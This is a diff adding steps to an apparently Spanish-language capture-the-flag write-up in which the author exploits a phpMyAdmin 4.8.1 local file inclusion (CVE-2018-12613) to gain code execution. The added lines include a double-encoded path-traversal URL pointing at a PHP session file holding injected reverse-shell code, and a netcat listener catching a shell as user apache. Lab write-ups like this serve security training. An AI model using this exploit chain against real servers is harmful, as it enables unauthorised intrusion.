@@ -17,6 +17,7 @@ image: https://github.com/user-attachments/assets/bb94b984-cc01-4945-a8ba-7b5bd7
 * phpMyAdmin Local File Inclusion
 * Internal Port Discovery through LFI (/proc/net/tcp)
 * Abusing phpMyAdmin 4.8.1 LFI to RCE via id_session (CVE-2018-12613)
+* PHP Vulnerability Code Analisys (index.php)
 
 ## Enumeration
 
@@ -235,4 +236,21 @@ listening on [any] 4444 ...
 ```
 
 Me dirijo a http://datasafe.votenow.local/ y en el apartado de consultas SQL incluyo una consulta SQL con código PHP que ejecuta un reverse shell hacia mi máquina atacante
+
+![imagen](https://github.com/user-attachments/assets/071640dd-68dc-4276-8e59-b4f289f727e6)
+
+Me aprovecho del LFI para apuntar a mi session y así ejecutar el código PHP almacenado, introduzco en la URL: http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_bu08avjvlj87iusllqkr49skv9n9n8cn
+
+![imagen](https://github.com/user-attachments/assets/3f00e922-81be-4803-a69d-b1259aea1ed2)
+
+Consigo obtener acceso al sistema como el usuario apache
+
+```bash
+nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.2.133] from (UNKNOWN) [192.168.2.142] 36112
+bash: no job control in this shell
+bash-4.2$ whoami
+apache
+```
 
